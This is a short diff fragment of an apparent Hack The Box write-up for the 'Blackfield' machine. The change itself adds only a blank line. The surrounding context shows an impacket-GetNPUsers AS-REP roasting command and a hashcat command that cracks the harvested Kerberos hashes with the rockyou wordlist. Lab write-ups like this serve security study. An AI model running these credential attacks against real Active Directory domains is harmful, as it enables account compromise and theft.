@@ -54,4 +54,5 @@ impacket-GetNPUsers BLACKFIELD.local/ -usersfile user.txt -format hashcat -outpu
 
 hashcat -m 18200 --force -a 0 hashes.asreproast /user/share/worldists/rockyou.txt
 ```
+
 ![GetNPUsers](/HTB/Machines/images/Blackfield-GetNPUsers.png)
